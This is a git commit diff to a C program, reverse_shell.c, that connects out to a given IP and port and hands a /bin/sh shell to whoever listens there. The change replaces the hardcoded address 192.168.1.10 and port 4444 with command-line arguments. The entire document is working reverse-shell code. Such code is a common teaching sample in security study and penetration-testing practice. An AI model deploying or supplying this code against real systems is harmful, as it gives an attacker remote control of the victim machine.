286e6e8827f57ccdb67e5f63253d61cb299740f6
Guillem <46190684+galminyana@users.noreply.github.com>
2021-05-08 11:50:04 +0200

    Update reverse_shell.c

--- Reverse_Shell/reverse_shell.c
+++ Reverse_Shell/reverse_shell.c
@@ -1,8 +1,7 @@
-/**
- TITLE: C Reverse Shell Example
- Author: Guillem Alminyana
  License: GPLv3 or Later
  Description: Connects using sockets to a IP and spawns a shell
+
+ Use: ./shell IP PORT
 **/
 
 #include <stdio.h>
@@ -13,25 +12,29 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
-int main(void){
-    int port = 4444;
+int main (int argc, char * argv[]) {
+
+    int port = atoi(argv[2]);
+    char * ip_address = argv[1];
+    char * const execve_params[] = {"/bin/sh", NULL};
+    char shell_to_exec[] = "/bin/sh";
+
     struct sockaddr_in my_sockaddr;
 
     int my_socket = socket(AF_INET, SOCK_STREAM, 0);              //<- Create the Socket
-  
+
     my_sockaddr.sin_family = AF_INET;                             //<- Put required info in sockaddr_in: IPv4 Protocol
     my_sockaddr.sin_port = htons(port);                           //   Port
-    my_sockaddr.sin_addr.s_addr = inet_addr("192.168.1.10");      //   IP Address
+    my_sockaddr.sin_addr.s_addr = inet_addr(ip_address);          //   IP Address
 
     connect(my_socket, (struct sockaddr *) &my_sockaddr,          //<- Connect to remote machine
-            sizeof(my_sockaddr)); 
-  
-    dup2(my_socket, 0);                                           //<- Duplicate STDIN, STDOUT and STDERR           
-    dup2(my_socket, 1);                                           //   to make the shell output be redirected 
+            sizeof(my_sockaddr));
+
+    dup2(my_socket, 0);                                           //<- Duplicate STDIN, STDOUT and STDERR
+    dup2(my_socket, 1);                                           //   to make the shell output be redirected
     dup2(my_socket, 2);                                           //   to the socket
 
-    char * const argv[] = {"/bin/sh", NULL};
-    execve("/bin/sh", argv, NULL);
+    execve(shell_to_exec, execve_params, NULL);                   //<- EXECVE syscall
 
-    return 0;       
+    return 0;
 }
